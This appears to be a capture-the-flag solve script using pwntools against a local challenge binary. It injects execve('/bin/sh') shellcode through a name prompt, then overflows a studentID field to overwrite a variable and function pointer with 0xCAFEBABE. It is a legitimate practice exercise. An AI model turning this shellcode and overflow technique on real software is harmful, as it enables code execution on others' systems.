from pwn import *

context.binary = exe = ELF('./pwn2', checksec = False)

p = process(exe.path)

shellcode = asm(
    '''
    mov rax, 29400045130965551
    push rax
    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch = 'amd64'
)
input()
#buoc 1: tao shellcode
payload = shellcode
p.sendlineafter(b'name: ', payload)

#buoc 2: overwrite a and ptr_func
payload = b'a'*0x34
payload += p32(0xCAFEBABE)
p.sendlineafter(b'studentID: ', payload)

p.interactive()